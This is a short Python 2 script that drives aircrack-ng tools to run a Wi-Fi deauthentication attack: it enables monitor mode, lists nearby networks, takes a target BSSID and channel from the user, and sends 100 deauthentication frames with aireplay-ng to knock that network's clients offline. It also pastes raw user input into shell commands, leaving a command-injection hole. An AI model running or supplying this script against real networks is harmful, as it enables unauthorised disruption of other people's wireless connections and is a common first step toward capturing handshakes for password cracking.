import os
import time
os.system("sudo airmon-ng start wlan0")
os.system("sudo airodump-ng wlan0mon")
x=raw_input("Copy and paste the BSSID of target wifi ")
channel=raw_input("Inter the Channel number")
print x,channel
st="sudo airodump-ng --bssid "+x+" --channel "+channel+ " wlan0mon"
print st
os.system(st)
st="sudo aireplay-ng -0 100 -a "+x+" wlan0mon"
os.system(st)
os.system("sudo airmon-ng stop wlan0mon")
